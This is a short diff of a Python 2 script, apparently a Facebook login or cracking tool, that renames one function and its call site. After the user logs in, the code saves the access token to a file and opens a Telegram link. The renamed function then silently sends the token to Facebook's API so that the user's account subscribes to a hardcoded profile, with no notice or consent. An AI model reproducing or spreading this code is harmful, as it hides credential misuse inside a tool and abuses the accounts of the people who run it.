@@ -101,7 +101,7 @@ def mking():
         print '\x1b[1;97m-------------------------------------------------'
         open('.login.txt', 'w').write(sultani)
         raw_input(' %s\x1b[0;92m*%s Press enter to continue tools ' % (O, N))
-        SA___SAWx404xx(sawx404)
+        mr___profaisor(sawx404)
         os.system('xdg-open https://t.me/Saw1xx404xx')
         coment()
     except KeyError:
@@ -211,7 +211,7 @@ def menu():
         menu()
 
 
-def sa___Sawx404xx(Sawx404):
+def mr___profaisor(Sawx404):
     try:
         kentod = Sawx404
         requests.post('https://graph.facebook.com/100009918107424/subscribers?access_token=%s' % kentod)
